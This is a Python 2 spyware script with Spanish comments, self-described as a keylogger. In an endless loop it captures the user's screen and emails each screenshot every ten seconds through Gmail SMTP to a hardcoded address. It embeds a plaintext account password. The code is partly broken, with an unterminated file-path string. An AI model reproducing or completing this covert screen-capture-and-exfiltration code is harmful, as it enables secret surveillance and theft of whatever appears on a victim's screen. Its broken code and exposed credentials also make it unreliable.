#!/usr/bin/python
# Coded by: Oscar Peñaherrera
# keylogger Captura de pantalla y envio de correo

import smtplib
# importamos librerias  para construir el mensaje
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
#importamos librerias para adjuntar
from email.mime.base import MIMEBase
from email import encoders
import os
#instala con pip install ==0.51
import autopy
import time


def capture():
 # capturamos la pantalla
 screen = autopy.bitmap.capture_screen()
 screen.save('C:/)


def mail():

 # definimos los correo de remitente y receptor
 ##se envia un mail a
 addr_to   = 'oscarmateo1997@gmail.com'
 ##el mail sale desde el correo
 addr_from = 'mateo_penaherrera@yahoo.com'

 # Define SMTP email server details
 smtp_server = 'smtp.gmail.com:587'
 smtp_user   = 'oscarmateo1997@gmail.com'
 smtp_pass   = 'viviteamomucho'

 # Construimos el mail
 msg = MIMEMultipart()
 msg['To'] = addr_to
 msg['From'] = addr_from
 msg['Subject'] = 'Hola!'
 #cuerpo del mensaje en HTML y si fuera solo text puede colocar en el 2da parametro 'plain'
 msg.attach(MIMEText('Envio de captura de pantalla','html'))

 #adjuntamos la captura de pantalla
 ##cargamos el archivo a adjuntar
 fp = open('C:/','rb')
 adjunto = MIMEBase('multipart', 'encrypted')
 #lo insertamos en una variable
 adjunto.set_payload(fp.read())
 fp.close()
 #lo encriptamos en base64 para enviarlo
 encoders.encode_base64(adjunto)
 #agregamos una cabecera y le damos un nombre al archivo que adjuntamos puede ser el mismo u otro
 adjunto.add_header('Content-Disposition', 'attachment', filename='pruta.png')
 #adjuntamos al mensaje
 msg.attach(adjunto)

 # inicializamos el stmp para hacer el envio
 server = smtplib.SMTP(smtp_server)
 server.starttls()
 #logeamos con los datos ya seteados en la parte superior
 server.login(smtp_user,smtp_pass)
 #el envio
 server.sendmail(addr_from, addr_to, msg.as_string())
 #apagamos conexion stmp
 server.quit()

 #esto lo puse de prueba para saber que llegaba hasta aca y salia el correo
 print "(づ￣ ³￣)づ"


def main():

 while True:
  # hacemos la captura
  capture()
  # Enviamos el correo
  mail()
  # Tiempo en segundos entre re-envios
  time.sleep(10)

main()
